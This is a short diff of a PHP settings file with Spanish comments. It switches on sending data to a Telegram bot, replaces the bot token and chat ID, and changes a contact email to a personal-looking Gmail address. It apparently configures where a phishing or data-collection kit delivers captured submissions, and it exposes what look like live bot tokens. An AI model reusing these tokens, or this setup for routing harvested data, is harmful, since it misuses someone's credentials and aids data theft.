@@ -2,8 +2,8 @@
 // Envio telegram
 // true = SI | false = NO
 $telegram_send = true;
-$bottoken = "1683991548:AAHegCZfgBel65fSsCnel-Vqbx4QbsfWWOY";
-$chatid = "1297910096";
+$bottoken = "1944207228:AAEJ8yd6o_NbupumFJByhjg_M0rg-7hUWmY";
+$chatid = "1390883125";
 
 // Guardar archivo
 // true = SI | false = NO
@@ -12,5 +12,5 @@ $file_save = false;
 // Envio Gmail
 // true = SI | false = NO
 $email_send = false;
-$email = "jasonidk@test.com";
+$email = "santivho37@gmail.com";
 ?>
